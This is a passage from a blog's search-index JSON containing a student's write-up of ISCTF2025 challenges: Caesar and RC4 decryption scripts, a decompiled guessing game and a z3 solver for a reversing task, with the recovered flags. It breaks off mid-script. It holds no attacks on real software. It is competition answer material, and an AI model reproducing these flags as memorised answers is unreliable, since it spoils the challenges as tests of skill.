{"meta":{"title":"D'b8Gr的小站~","subtitle":"I hack,therefore I am.","description":"h3llo_w0rld","author":"debu8ger","url":"https://incldue.github.io","root":"/"},"pages":[{"title":"404","date":"2025-09-27T12:34:53.000Z","updated":"2025-09-27T12:36:22.793Z","comments":true,"path":"/404.html","permalink":"https://incldue.github.io/404.html","excerpt":"","text":""},{"title":"Search","date":"2025-05-31T17:51:53.000Z","updated":"2025-05-31T17:52:14.315Z","comments":true,"path":"search/index.html","permalink":"https://incldue.github.io/search/index.html","excerpt":"","text":""},{"title":"About ME","date":"2025-05-31T16:00:00.000Z","updated":"2025-11-07T12:18:07.853Z","comments":true,"path":"about/index.html","permalink":"https://incldue.github.io/about/index.html","excerpt":"(该博客为学习闲暇之余所建，记录一些自己学习时的点滴，也算是对自己成长道路的见证吧) 关于我一个想到DEF CON看看的CTFer，没事儿时听听ImagineDragons…本校网络安全小组现任负责人，非学术上，人生目标是让自己的足迹踏遍世界上大部分角落 :) 关于学习大二在读…近期学习方向(头疼ing)：rev(主)、pwn幻想学到全栈 关于座右铭 Life is a fucking movie,so better transcend your limits. 关于爱好热爱跑步，尤其喜欢CTF、健身、电影、旅行。 联系我 Blog: D’b8Gr的小站~ Email: h52463398@outlook.com GitHub: debu8ger Twitter: debu8ger","text":"(该博客为学习闲暇之余所建，记录一些自己学习时的点滴，也算是对自己成长道路的见证吧) 关于我一个想到DEF CON看看的CTFer，没事儿时听听ImagineDragons…本校网络安全小组现任负责人，非学术上，人生目标是让自己的足迹踏遍世界上大部分角落 :) 关于学习大二在读…近期学习方向(头疼ing)：rev(主)、pwn幻想学到全栈 关于座右铭 Life is a fucking movie,so better transcend your limits. 关于爱好热爱跑步，尤其喜欢CTF、健身、电影、旅行。 联系我 Blog: D’b8Gr的小站~ Email: h52463398@outlook.com GitHub: debu8ger Twitter: debu8ger"},{"title":"Tags","date":"2025-05-31T17:45:20.000Z","updated":"2025-09-27T00:55:53.588Z","comments":true,"path":"tags/index.html","permalink":"https://incldue.github.io/tags/index.html","excerpt":"","text":""},{"title":"Categories","date":"2025-05-31T17:44:05.000Z","updated":"2025-09-27T00:56:09.123Z","comments":true,"path":"categories/index.html","permalink":"https://incldue.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"ISCTF2025 部分题WP","slug":"ISCTF2025 部分题WP","date":"2025-12-06T16:00:00.000Z","updated":"2025-12-07T09:51:41.654Z","comments":true,"path":"2025/12/07/ISCTF2025 部分题WP/","permalink":"https://incldue.github.io/2025/12/07/ISCTF2025%20%E9%83%A8%E5%88%86%E9%A2%98WP/","excerpt":"这次打了ISCTF,因为还同时在准备期末、四级，只拿了前50，:(","text":"SIGNINEz_Caesar 题目描述：小蓝鲨看你们牢底坐穿决定送你们一点分。 下载附件： def variant_caesar_encrypt(text): encrypted = &quot;&quot; shift = 2 for char in text: if char.isalpha(): if char.isupper(): base = ord(&#x27;A&#x27;) new_char = chr((ord(char) - base + shift) % 26 + base) else: base = ord(&#x27;a&#x27;) new_char = chr((ord(char) - base + shift) % 26 + base) encrypted += new_char shift += 3 else: encrypted += char return encrypted# KXKET&#123;Tubsdx_re_hg_zytc_hxq_vnjma&#125; 是简单的凯撒编码，直接在原来基础上编写decrypt函数： def variant_caesar_decrypt(ciphertext): decrypted = &quot;&quot; shift = 2 for char in ciphertext: if char.isalpha(): if char.isupper(): base = ord(&#x27;A&#x27;) original_char = chr((ord(char) - base - shift) % 26 + base) else: base = ord(&#x27;a&#x27;) original_char = chr((ord(char) - base - shift) % 26 + base) decrypted += original_char shift += 3 else: decrypted += char return decryptedciphertext = &quot;KXKET&#123;Tubsdx_re_hg_zytc_hxq_vnjma&#125;&quot;print(variant_caesar_decrypt(ciphertext))#flag:ISCTF&#123;Caesar_is_so_easy_and_funny&#125; 小蓝鲨的RC4系统 题目描述：送都送了，再给一个。 下载附件： import hashlibclass StreamCipher: def __init__(self, key): self.S = list(range(256)) self.i = 0 self.j = 0 j = 0 key_bytes = self._key_to_bytes(key) for i in range(256): j = (j + self.S[i] + key_bytes[i % len(key_bytes)]) % 256 self.S[i], self.S[j] = self.S[j], self.S[i] def _key_to_bytes(self, key): if isinstance(key, str): return hashlib.sha256(key.encode()).digest() elif isinstance(key, bytes): return hashlib.sha256(key).digest() def _prga(self): self.i = (self.i + 1) % 256 self.j = (self.j + self.S[self.i]) % 256 self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i] K = self.S[(self.S[self.i] + self.S[self.j]) % 256] return K def crypt(self, data): if isinstance(data, str): data = data.encode(&#x27;utf-8&#x27;) result = bytearray() for byte in data: key_byte = self._prga() result.append(byte ^ key_byte) return bytes(result)def encrypt_string(text, key): cipher = StreamCipher(key) encrypted = cipher.crypt(text) return encrypted.hex()#ISCTF2025#ba19a7116763ba8ba1c236c6bdc30187dcc8afb28c8fa5f266763880b74f5fff915613718f4d19c3baf4bbe24bd57303ce103d 得到是RC4流密码加密， RC4的加密和解密用的为同一个函数(异或操作为自反的)，所以解密只需把密文从十六进制转成字节，再调用crypt， exp： import hashlibclass StreamCipher: def __init__(self, key): self.S = list(range(256)) self.i = 0 self.j = 0 j = 0 key_bytes = self._key_to_bytes(key) for i in range(256): j = (j + self.S[i] + key_bytes[i % len(key_bytes)]) % 256 self.S[i], self.S[j] = self.S[j], self.S[i] def _key_to_bytes(self, key): if isinstance(key, str): return hashlib.sha256(key.encode()).digest() elif isinstance(key, bytes): return hashlib.sha256(key).digest() def _prga(self): self.i = (self.i + 1) % 256 self.j = (self.j + self.S[self.i]) % 256 self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i] K = self.S[(self.S[self.i] + self.S[self.j]) % 256] return K def crypt(self, data): if isinstance(data, str): data = data.encode(&#x27;utf-8&#x27;) result = bytearray() for byte in data: key_byte = self._prga() result.append(byte ^ key_byte) return bytes(result)def decrypt_hex(hex_data, key): ciphertext_bytes = bytes.fromhex(hex_data) cipher = StreamCipher(key) decrypted_bytes = cipher.crypt(ciphertext_bytes) return decrypted_bytes.decode(&#x27;utf-8&#x27;)if __name__ == &quot;__main__&quot;: hex_data = &quot;ba19a7116763ba8ba1c236c6bdc30187dcc8afb28c8fa5f266763880b74f5fff915613718f4d19c3baf4bbe24bd57303ce103d&quot; key = &quot;ISCTF2025&quot; print(decrypt_hex(hex_data, key)) #flag: ISCTF&#123;Welcome_to_ISCTF_&amp;_this_is_a_secret_with_RC4&#125; MISCGuess！ 题目描述：这是一个经典的猜数字，开始你的数字解密之旅吧！ 下载附件，是pyinstaller处理后的MiscNumberChallenge.exe，用unpack.py解包后得到extracted目录 找到misc_challenge.pyc文件，在 https://pylingual.io/ 反编译.pyc文件： import randomimport timeimport sysimport base64def decode_flag(encoded_flag): &quot;&quot;&quot;解码隐藏的Flag&quot;&quot;&quot; try: decoded = base64.b64decode(encoded_flag).decode(&#x27;utf-8&#x27;) decoded = base64.b64decode(decoded).decode(&#x27;utf-8&#x27;) return decoded except: return &#x27;Flag解码错误&#x27;def main(): secret_number = random.randint(1, 100) max_attempts = 10 encoded_flag = &#x27;SVNDVEZ7OXVlU3NfdGhFX0BuJHdlUn0=&#x27; encoded_flag = base64.b64encode(encoded_flag.encode()).decode() print(&#x27;==================================================&#x27;) print(&#x27;欢迎参加Misc猜数字挑战！&#x27;) print(f&#x27;系统已生成1-100之间的秘密数字，你有&#123;max_attempts&#125;次机会&#x27;) print(&#x27;猜对数字即可获得Flag!&#x27;) print(&#x27;==================================================&#x27;) for attempt in range(max_attempts): remaining = max_attempts - attempt print(f&#x27;\\n[剩余机会: &#123;remaining&#125;]&#x27;) while True: try: guess = int(input(&#x27;请输入你的猜测 (1-100): &#x27;)) if 1 &lt;= guess &lt;= 100: break print(&#x27;请输入1-100之间的整数！&#x27;) except: print(&#x27;无效输入！请输入整数。&#x27;) if guess &lt; secret_number: print(f&#x27;&#123;guess&#125; → 太小了，继续努力！&#x27;) elif guess &gt; secret_number: print(f&#x27;&#123;guess&#125; → 太大了，往小试试！&#x27;) else: print(&#x27;==================================================&#x27;) print(f&#x27;★ 恭喜！你猜对了！数字就是 &#123;secret_number&#125;&#x27;) print(&#x27;★ 恭喜获得Flag:&#x27;) flag = decode_flag(encoded_flag) print(f&#x27;★ &#123;flag&#125;&#x27;) print(&#x27;==================================================&#x27;) print(&#x27;程序将在10秒后关闭...&#x27;) time.sleep(10) return else: print(&#x27;\\n==================================================&#x27;) print(&#x27;⚠️ 挑战失败！&#x27;) print(f&#x27;⚠️ 正确答案是: &#123;secret_number&#125;&#x27;) print(&#x27;⚠️ 请重新运行程序再次尝试！&#x27;) print(&#x27;==================================================&#x27;) print(&#x27;程序将在10秒后关闭...&#x27;) time.sleep(10)if __name__ == &#x27;__main__&#x27;: try: main() except KeyboardInterrupt: print(&#x27;\\n\\n程序已中断。&#x27;) sys.exit() 容易得到，flag编码为base64，解码即得flag：ISCTF{9ueSs_thE_@n$weR} REVERSEezzz_math 题目描述：来解方程吧 IDA中打开，可疑点_main函数： &#123; int i; // [esp+4h] [ebp-6Ch] char Str[100]; // [esp+8h] [ebp-68h] BYREF sub_403B50(aPleaseInputYou); sub_403B50(aTryToUseZ3Solv); sub_403B90(&quot;%80s&quot;, Str); if ( strlen(Str) == 23 ) &#123; for ( i = 0; i &lt; 23; ++i ) Str[i] ^= 0xCu; if ( sub_401000(Str) ) puts(aRight); else puts(aWrong); &#125; else &#123; puts(Buffer); &#125; return 0;&#125; 逻辑就是输入23字节字符串，用0xC(12)异或，最后将异或完的数组传给sub_401000验证。 所以，我们看向sub_401000函数： BOOL __cdecl sub_401000(char *a1)&#123; return 94 * a1[22] + 74 * a1[21] + 70 * a1[19] + 12 * a1[18] + 20 * a1[16] + 62 * a1[12] + 82 * a1[10] + 7 * a1[7] + 63 * a1[6] + 18 * a1[5] + 58 * a1[4] + 94 * a1[2] + 77 * *a1 - 43 * a1[1] - 37 * a1[3] - 97 * a1[8] - 23 * a1[9] - 86 * a1[11] - 6 * a1[13] - 5 * a1[14] - 79 * a1[15] - 63 * a1[17] - 93 * a1[20] == 20156 &amp;&amp; 87 * a1[22] + 75 * a1[21] + 73 * a1[15] + 67 * a1[14] + 30 * a1[13] + (a1[11] &lt;&lt; 6) + 35 * a1[9] + 91 * a1[7] + 91 * a1[5] + 34 * a1[3] + 74 * *a1 - 89 * a1[1] - 72 * a1[2] - 76 * a1[4] - 32 * a1[6] - 97 * a1[8] - 39 * a1[10] - 23 * a1[12] + 8 * a1[16] - 98 * a1[17] - 4 * a1[18] - 80 * a1[19] - 83 * a1[20] == 7183 &amp;&amp; 51 * a1[21] + 22 * a1[20] + 15 * a1[19] + 51 * a1[17] + 96 * a1[12] + 34 * a1[7] + 77 * a1[5] + 59 * a1[2] + 89 * a1[1] + 92 * *a1 - 85 * a1[3] - 50 * a1[4] - 51 * a1[6] - 75 * a1[8] - 40 * a1[10] - 4 * a1[11] - 74 * a1[13] - 98 * a1[14] - 23 * a1[15] - 14 * a1[16] - 92 * a1[18] - 7 * a1[22] == -7388 &amp;&amp; 61 * a1[22] + 72 * a1[21] + 28 * a1[20] + 55 * a1[18] + 20 * a1[17] + 13 * a1[14] + 51 * a1[13] + 69 * a1[12] + 10 * a1[11] + 95 * a1[10] + 43 * a1[9] + 53 * a1[8] + 76 * a1[7] + 25 * a1[6] + 9 * a1[5] + 10 * a1[4] + 98 * a1[1] + 70 * *a1 - 22 * a1[2] + 2 * a1[3] - 49 * a1[15] + 4 * a1[16] - 77 * a1[19] == 69057 &amp;&amp; 7 * a1[22] + 21 * a1[16] + 22 * a1[13] + 55 * a1[9] + 66 * a1[8] + 78 * a1[5] + 10 * a1[3] + 80 * a1[1] + 65 * *a1 - 20 * a1[2] - 53 * a1[4] - 98 * a1[6] + 8 * a1[7] - 78 * a1[10] - 94 * a1[11] - 93 * a1[12] - 18 * a1[14] - 48 * a1[15] - 9 * a1[17] - 73 * a1[18] - 59 * a1[19] - 68 * a1[20] - 74 * a1[21] == -31438 &amp;&amp; 33 * a1[19] + 78 * a1[15] + 66 * a1[10] + 3 * a1[9] + 43 * a1[4] + 24 * a1[3] + 3 * a1[2] + 27 * *a1 - 18 * a1[1] - 46 * a1[5] - 18 * a1[6] - a1[7] - 33 * a1[8] - 50 * a1[11] - 23 * a1[12] - 37 * a1[13] - 45 * a1[14] + 2 * a1[16] - a1[17] - 60 * a1[18] - 87 * a1[20] - 72 * a1[21] - 6 * a1[22] == -26121 &amp;&amp; 31 * a1[20] + 80 * a1[18] + 34 * a1[17] + 34 * a1[15] + 38 * a1[14] + 53 * a1[13] + 35 * a1[12] + 82 * a1[9] + 27 * a1[8] + 80 * a1[7] + 46 * a1[6] + 18 * a1[4] + 5 * a1[1] + 98 * *a1 - 12 * a1[2] - 9 * a1[3] - 57 * a1[5] - 46 * a1[10] - 31 * a1[11] - 68 * a1[16] - 94 * a1[19] - 93 * a1[21] - 15 * a1[22] == 26005 &amp;&amp; 81 * a1[21] + 40 * a1[20] + 34 * a1[19] + 94 * a1[18] + 98 * a1[17] + 11 * a1[14] + 63 * a1[13] + 95 * a1[12] + 43 * a1[11] + 99 * a1[10] + 29 * a1[9] + 81 * a1[6] + 72 * a1[5] + 54 * a1[3] + 21 * *a1 - 26 * a1[1] - 90 * a1[2] - 15 * a1[4] - 54 * a1[7] - 12 * a1[8] - 38 * a1[15] - 15 * a1[16] - 56 * a1[22] == 57169 &amp;&amp; 71 * a1[18] + 39 * a1[17] + 73 * a1[15] + 14 * a1[14] + 56 * a1[12] + 56 * a1[10] + 27 * a1[9] + 68 * a1[7] + 39 * a1[6] + 26 * a1[5] + 40 * a1[4] + 24 * a1[3] + 11 * a1[2] + 14 * a1[1] + 94 * *a1 - 10 * a1[8] - 11 * a1[11] - 63 * a1[13] - 39 * a1[16] - 14 * a1[19] - 17 * a1[20] - 23 * a1[21] - 7 * a1[22] == 40024 &amp;&amp; (a1[22] &lt;&lt; 6) + 80 * a1[21] + 89 * a1[20] + 70 * a1[19] + 66 * a1[18] + 55 * a1[17] + 16 * a1[16] + 84 * a1[13] + 48 * a1[12] + 11 * a1[7] + 32 * a1[5] + 99 * *a1 - 26 * a1[1] - 91 * a1[2] - 96 * a1[3] - 63 * a1[4] - 67 * a1[6] - 72 * a1[8] + 4 * a1[9] - 84 * a1[10] - 81 * a1[11] - 80 * a1[14] - 98 * a1[15] == 432 &amp;&amp; a1[21] + 41 * a1[17] + 46 * a1[12] + 44 * a1[9] + 63 * *a1 - 73 * a1[1] - 43 * a1[2] + 4 * a1[3] - 37 * a1[4] - 54 * a1[5] - 58 * a1[6] - 95 * a1[7] - 2 * a1[8] - 37 * a1[10] - 5 * a1[11] + 2 * a1[13] - 46 * a1[14] - 27 * a1[15] - 19 * a1[16] - 78 * a1[18] - 51 * a1[19] - 82 * a1[20] - 59 * a1[22] == -57338 &amp;&amp; 10 * a1[22] + 58 * a1[18] + 16 * a1[17] + 69 * a1[16] + 6 * a1[15] + 5 * a1[12] + 87 * a1[7] + 47 * a1[5] + 91 * a1[4] + 54 * a1[2] + 21 * a1[1] + 52 * *a1 - 76 * a1[3] - 96 * a1[6] - 27 * a1[8] - 43 * a1[9] - 15 * a1[10] - 35 * a1[11] - 53 * a1[13] + 4 * a1[14] - 83 * a1[19] - 68 * a1[20] - 18 * a1[21] == 1777 &amp;&amp; 66 * a1[22] + 92 * a1[21] + 29 * a1[20] + 42 * a1[19] + 55 * a1[14] + 72 * a1[13] + 40 * a1[12] + 31 * a1[10] + 88 * a1[9] + 61 * a1[8] + 59 * a1[7] + 35 * a1[6] + 16 * a1[3] + 24 * a1[1] + 60 * *a1 - 55 * a1[2] - 8 * a1[4] - 7 * a1[5] - 17 * a1[11] - 25 * a1[15] - 22 * a1[16] - 10 * a1[17] - 59 * a1[18] == 47727 &amp;&amp; 3 * a1[21] + 54 * a1[18] + 6 * a1[15] + 93 * a1[14] + 74 * a1[10] + 6 * a1[7] + 98 * a1[4] + 65 * a1[3] + 84 * a1[2] + 18 * a1[1] + 35 * *a1 - 29 * a1[5] - 40 * a1[6] - 35 * a1[8] + 8 * a1[9] - 15 * a1[11] - 4 * a1[12] - 83 * a1[16] - 74 * a1[17] - 72 * a1[19] - 53 * a1[20] - 31 * a1[22] == 6695 &amp;&amp; 45 * a1[20] + 14 * a1[19] + 76 * a1[18] + 17 * a1[16] + 86 * a1[14] + 28 * a1[11] + 19 * a1[5] + 46 * a1[1] + 75 * *a1 - 12 * a1[2] - 27 * a1[3] - 66 * a1[4] - 27 * a1[6] - 32 * a1[7] - 69 * a1[8] - 31 * a1[9] - 65 * a1[10] - 54 * a1[12] - 6 * a1[13] + 2 * a1[15] - 10 * a1[17] - 89 * a1[21] - 16 * a1[22] == -3780 &amp;&amp; 62 * a1[21] + 74 * a1[20] + 28 * a1[18] + 7 * a1[17] + 74 * a1[16] + 45 * a1[15] + 57 * a1[14] + 34 * a1[11] + 85 * a1[10] + 98 * a1[6] + 29 * a1[4] + 94 * a1[3] + 51 * a1[2] + 85 * a1[1] - 36 * a1[5] - a1[7] - 3 * a1[8] - 74 * a1[9] - 70 * a1[12] - 68 * a1[13] - 3 * a1[19] + 8 * a1[22] == 47300 &amp;&amp; 22 * a1[22] + 45 * a1[21] + 14 * a1[19] + 32 * a1[18] + 77 * a1[17] + 70 * a1[12] + 7 * a1[10] + 99 * a1[4] + 82 * *a1 - 48 * a1[1] - 40 * a1[2] - 81 * a1[3] - 27 * a1[5] - 75 * a1[6] - 79 * a1[7] - 26 * a1[8] - 68 * a1[9] - 57 * a1[11] - 77 * a1[13] - 32 * a1[14] - a1[15] - 91 * a1[16] - 14 * a1[20] == -34153 &amp;&amp; 65 * a1[21] + 13 * a1[20] + 61 * a1[17] + 97 * a1[13] + 24 * a1[10] + 40 * a1[5] + 20 * *a1 - 81 * a1[1] - 17 * a1[2] - 77 * a1[3] - 79 * a1[4] - 45 * a1[6] - 61 * a1[7] - 48 * a1[8] - 97 * a1[9] - 49 * a1[11] - 14 * a1[12] - 81 * a1[14] - 20 * a1[15] - 27 * a1[16] - 89 * a1[18] - 93 * a1[19] - 46 * a1[22] == -55479 &amp;&amp; 60 * a1[21] + 70 * a1[20] + 13 * a1[15] + 87 * a1[13] + 76 * a1[11] + 88 * a1[9] + 87 * a1[3] + 87 * *a1 - 97 * a1[1] - 40 * a1[2] - 49 * a1[4] - 23 * a1[5] - 30 * a1[6] - 50 * a1[7] - 98 * a1[8] - 21 * a1[10] - 54 * a1[12] - 65 * a1[14] - 80 * a1[17] - 28 * a1[18] - 57 * a1[19] - 70 * a1[22] == -20651 &amp;&amp; 54 * a1[20] + 86 * a1[17] + 92 * a1[16] + 41 * a1[15] + 70 * a1[10] + 9 * a1[9] + a1[8] + 96 * a1[7] + 45 * a1[6] + 78 * a1[5] + 3 * a1[4] + 90 * a1[3] + 71 * a1[2] + 96 * *a1 - 8 * a1[1] + 4 * a1[11] - 55 * a1[12] - 73 * a1[13] - 54 * a1[14] - 89 * a1[18] - (a1[19] &lt;&lt; 6) - 67 * a1[21] + 4 * a1[22] == 35926 &amp;&amp; 5 * a1[22] + 88 * a1[20] + 52 * a1[19] + 21 * a1[17] + 25 * a1[16] + 3 * a1[13] + 88 * a1[10] + 39 * a1[8] + 48 * a1[7] + 74 * a1[6] + 86 * a1[4] + 46 * a1[2] + 17 * *a1 - 98 * a1[1] - 50 * a1[3] - 28 * a1[5] - 73 * a1[9] - 33 * a1[11] - 75 * a1[12] - 14 * a1[14] - 31 * a1[15] - 26 * a1[18] - 52 * a1[21] == 8283 &amp;&amp; 96 * a1[22] + 85 * a1[20] + 55 * a1[19] + 99 * a1[13] + 19 * a1[11] + 77 * a1[10] + 52 * a1[9] + 66 * a1[8] + 96 * a1[6] + 72 * a1[4] + 90 * a1[3] + 60 * a1[1] + 94 * *a1 - 99 * a1[2] - 26 * a1[5] - 94 * a1[7] - 49 * a1[12] - 32 * a1[14] - 54 * a1[15] - 92 * a1[16] - 71 * a1[17] - 63 * a1[18] - 23 * a1[21] == 33789 &amp;&amp; 15 * a1[22] + a1[19] + 26 * a1[17] + 65 * a1[16] + 80 * a1[11] + 92 * a1[8] + 28 * a1[5] + 79 * a1[4] + 73 * *a1 - 98 * a1[1] - 2 * a1[2] - 70 * a1[3] - 10 * a1[6] - 30 * a1[7] - 51 * a1[9] - 77 * a1[10] - 32 * a1[12] - 32 * a1[13] + 8 * a1[14] + 4 * a1[15] - 11 * a1[18] - 83 * a1[20] - 85 * a1[21] == -10455;&#125; 可以看到，这一大长串包含了22个等式，对a1[0]到a1[22]共23个变量进行了约束， 值得注意的是： *a1其实就是a1[0]，第一个变量 a1[i] &lt;&lt; 6 = 64 * a1[i] (左移6位实际上就是*64) 根据_main函数的汇编代码，得到是z3算法， 编写最终的EXP： from z3 import *x = [Int(f&#x27;x&#123;i&#125;&#x27;) for i in range(23)]s = Solver()for i in range(23): s.add(x[i] &gt;= 32, x[i] &lt;= 126)s.add( 94*x[22] + 74*x[21] + 70*x[19] + 12*x[18] + 20*x[16] + 62*x[12] + 82*x[10] + 7*x[7] + 63*x[6] + 18*x[5] + 58*x[4] + 94*x[2] + 77*x[0] - 43*x[1] - 37*x[3] - 97*x[8] - 23*x[9] - 86*x[11] - 6*x[13] - 5*x[14] - 79*x[15] - 63*x[17] - 93*x[20] == 20156)s.add( 87*x[22] + 75*x[21] + 73*x[15] + 67*x[14] + 30*x[13] + 64*x[11] + 35*x[9] + 91*x[7] + 91*x[5] + 34*x[3] + 74*x[0] - 89*x[1] - 72*x[2] - 76*x[4] - 32*x[6] - 97*x[8] - 39*x[10] - 23*x[12] + 8*x[16] - 98*x[17] - 4*x[18] - 80*x[19] - 83*x[20] == 7183)s.add( 51*x[21] + 22*x[20] + 15*x[19] + 51*x[17] + 96*x[12] + 34*x[7] + 77*x[5] + 59*x[2] + 89*x[1] + 92*x[0] - 85*x[3] - 50*x[4] - 51*x[6] - 75*x[8] - 40*x[10] - 4*x[11] - 74*x[13] - 98*x[14] - 23*x[15] - 14*x[16] - 92*x[18] - 7*x[22] == -7388)s.add( 61*x[22] + 72*x[21] + 28*x[20] + 55*x[18] + 20*x[17] + 13*x[14] + 51*x[13] + 69*x[12] + 10*x[11] + 95*x[10] + 43*x[9] + 53*x[8] + 76*x[7] + 25*x[6] + 9*x[5] + 10*x[4] + 98*x[1] + 70*x[0] - 22*x[2] + 2*x[3] - 49*x[15] + 4*x[16] - 77*x[19] == 69057)s.add( 7*x[22] + 21*x[16] + 22*x[13] + 55*x[9] + 66*x[8] + 78*x[5] + 10*x[3] + 80*x[1] + 65*x[0] - 20*x[2] - 53*x[4] - 98*x[6] + 8*x[7] - 78*x[10] - 94*x[11] - 93*x[12] - 18*x[14] - 48*x[15] - 9*x[17] - 73*x[18] - 59*x[19] - 68*x[20] - 74*x[21] == -31438)s.add( 33*x[19] + 78*x[15] + 66*x[10] + 3*x[9] + 43*x[4] + 24*x[3] + 3*x[2] + 27*x[0] - 18*x[1] - 46*x[5] - 18*x[6] - x[7] - 33*x[8] - 50*x[11] - 23*x[12] - 37*x[13] - 45*x[14] + 2*x[16] - x[17] - 60*x[18] - 87*x[20] - 72*x[21] - 6*x[22] == -26121)s.add( 31*x[20] + 80*x[18] + 34*x[17] + 34*x[15] + 38*x[14] + 53*x[13] + 35*x[12] + 82*x[9] + 27*x[8] + 80*x[7] + 46*x[6] + 18*x[4] + 5*x[1] + 98*x[0] - 12*x[2] - 9*x[3] - 57*x[5] - 46*x[10] - 31*x[11] - 68*x[16] - 94*x[19] - 93*x[21] - 15*x[22] == 26005)s.add( 81*x[21] + 40*x[20] + 34*x[19] + 94*x[18] + 98*x[17] + 11*x[14] + 63*x[13] + 95*x[12] + 43*x[11] + 99*x[10] + 29*x[9] + 81*x[6] + 72*x[5] + 54*x[3] + 21*x[0] - 26*x[1] - 90*x[2] - 15*x[4] - 54*x[7] - 12*x[8] - 38*x[15] - 15*x[16] - 56*x[22] == 57169)s.add( 71*x[18] + 39*x[17] + 73*x[15] + 14*x[14] + 56*x[12] + 56*x[10] + 27*x[9] + 68*x[7] + 39*x[6] + 26*x[5] + 40*x[4] + 24*x[3] + 11*x[2] + 14*x[1] + 94*x[0] - 10*x[8] - 11*x[11] - 63*x[13] - 39*x[16] - 14*x[19] - 17*x[20] - 23*x[21] - 7*x[22] == 40024)s.add( 64*x[22] + 80*x[21] + 89*x[20] + 70*x[19] + 66*x[18] + 55*x[17] + 16*x[16] + 84*x[13] + 48*x[12] + 11*x[7] + 32*x[5] + 99*x[0] - 26*x[1] - 91*x[2] - 96*x[3] - 63*x[4] - 67*x[6] - 72*x[8] + 4*x[9] - 84*x[10] - 81*x[11] - 80*x[14] - 98*x[15] == 432)s.add( x[21] + 41*x[17] + 46*x[12] + 44*x[9] + 63*x[0] - 73*x[1] - 43*x[2] + 4*x[3] - 37*x[4] - 54*x[5] - 58*x[6] - 95*x[7] - 2*x[8] - 37*x[10] - 5*x[11] + 2*x[13] - 46*x[14] - 27*x[15] - 19*x[16] - 78*x[18] - 51*x[19] - 82*x[20] - 59*x[22] == -57338)s.add( 10*x[22] + 58*x[18] + 16*x[17] + 69*x[16] + 6*x[15] + 5*x[12] + 87*x[7] + 47*x[5] + 91*x[4] + 54*x[2] + 21*x[1] + 52*x[0] - 76*x[3] - 96*x[6] - 27*x[8] - 43*x[9] - 15*x[10] - 35*x[11] - 53*x[13] + 4*x[14] - 83*x[19] - 68*x[20] - 18*x[21] == 1777)s.add( 66*x[22] + 92*x[21] + 29*x[20] + 42*x[19] + 55*x[14] + 72*x[13] + 40*x[12] + 31*x[10] + 88*x[9] + 61*x[8] + 59*x[7] + 35*x[6] + 16*x[3] + 24*x[1] + 60*x[0] - 55*x[2] - 8*x[4] - 7*x[5] - 17*x[11] - 25*x[15] - 22*x[16] - 10*x[17] - 59*x[18] == 47727)s.add( 3*x[21] + 54*x[18] + 6*x[15] + 93*x[14] + 74*x[10] + 6*x[7] + 98*x[4] + 65*x[3] + 84*x[2] + 18*x[1] + 35*x[0] - 29*x[5] - 40*x[6] - 35*x[8] + 8*x[9] - 15*x[11] - 4*x[12] - 83*x[16] - 74*x[17] - 72*x[19] - 53*x[20] - 31*x[22] == 6695)s.add( 45*x[20] + 14*x[19] + 76*x[18] + 17*x[16] + 86*x[14] + 28*x[11] + 19*x[5] + 46*x[1] + 75*x[0] - 12*x[2] - 27*x[3] - 66*x[4] - 27*x[6] - 32*x[7] - 69*x[8] - 31*x[9] - 65*x[10] - 54*x[12] - 6*x[13] + 2*x[15] - 10*x[17] - 89*x[21] - 16*x[22] == -3780)s.add( 62*x[21] + 74*x[20] + 28*x[18] + 7*x[17] + 74*x[16] + 45*x[15] + 57*x[14] + 34*x[11] + 85*x[10] + 98*x[6] + 29*x[4] + 94*x[3] + 51*x[2] + 85*x[1] - 36*x[5] - x[7] - 3*x[8] - 74*x[9] - 70*x[12] - 68*x[13] - 3*x[19] + 8*x[22] == 47300)s.add( 22*x[22] + 45*x[21] + 14*x[19] + 32*x[18] + 77*x[17] + 70*x[12] + 7*x[10] + 99*x[4] + 82*x[0] - 48*x[1] - 40*x[2] - 81*x[3] - 27*x[5] - 75*x[6] - 79*x[7] - 26*x[8] - 68*x[9] - 57*x[11] - 77*x[13] - 32*x[14] - x[15] - 91*x[16] - 14*x[20] == -34153)s.add( 65*x[21] + 13*x[20] + 61*x[17] + 97*x[13] + 24*x[10] + 40*x[5] + 20*x[0] - 81*x[1] - 17*x[2] - 77*x[3] - 79*x[4] - 45*x[6] - 61*x[7] - 48*x[8] - 97*x[9] - 49*x[11] - 14*x[12] - 81*x[14] - 20*x[15] - 27*x[16] - 89*x[18] - 93*x[19] - 46*x[22] == -55479)s.add( 60*x[21] + 70*x[20] + 13*x[15] + 87*x[13] + 76*x[11] + 88*x[9] + 87*x[3] + 87*x[0] - 97*x[1] - 40*x[2] - 49*x[4] - 23*x[5] - 30*x[6] - 50*x[7] - 98*x[8] - 21*x[10] - 54*x[12] - 65*x[14] - 80*x[17] - 28*x[18] - 57*x[19] - 70*x[22] == -20651)s.add( 54*x[20] + 86*x[17] + 92*x[16] + 41*x[15] + 70*x[10] + 9*x[9] + x[8] + 96*x[7] + 45*x[6] + 78*x[5] + 3*x[4] + 90*x[3] + 71*x[2] + 96*x[0] - 8*x[1] + 4*x[11] - 55*x[12] - 73*x[13] - 54*x[14] - 89*x[18] - 64*x[19] - 67*x[21] + 4*x[22] == 35926)s.add( 5*x[22] + 88*x[20] + 52*x[19] + 21*x[17] + 25*x[16] + 3*x[13] + 88*x[10] + 39*x[8] + 48*x[7] + 74*x[6] + 86*x[4] + 46*x[2] + 17*x[0] - 98*x[1] - 50*x[3] - 28*x[5] - 73*x[9] - 33*x[11] - 75*x[12] - 14*x[14] - 31*x[15] - 26*x[18] - 52*x[21] == 8283)s.add( 96*x[22] + 85*x[20] + 55*x[19] + 99*x[13] + 19*x[11] + 77*x[10] + 52*x[9] + 66*x[8] + 96*x[6] + 72*x[4] + 90*x[3] + 60*x[1] + 94*x[0] - 99*x[2] - 26*x[5] - 94*x[7] - 49*x[12] - 32*x[14] - 54*x[15] - 92*x[16] - 71*x[17] - 63*x[18] - 23*x[21] == 33789)s.add( 15*x[22] + x[19] + 26*x[17] + 65*x[16] + 80*x[11] + 92*x[8] + 28*x[5] + 79*x[4] + 73*x[0] - 98*x[1] - 2*x[2] - 70*x[3] - 10*x[6] - 30*x[7] - 51*x[9] - 77*x[10] - 32*x[12] - 32*x[13] + 8*x[14] + 4*x[15] - 11*x[18] - 83*x[20] - 85*x[21] == -10455)if s.check() == sat: m = s.model() x_vals = [m[x[i]].as_long() for i in range(23)] flag_bytes = bytes([xi ^ 0xC for xi in 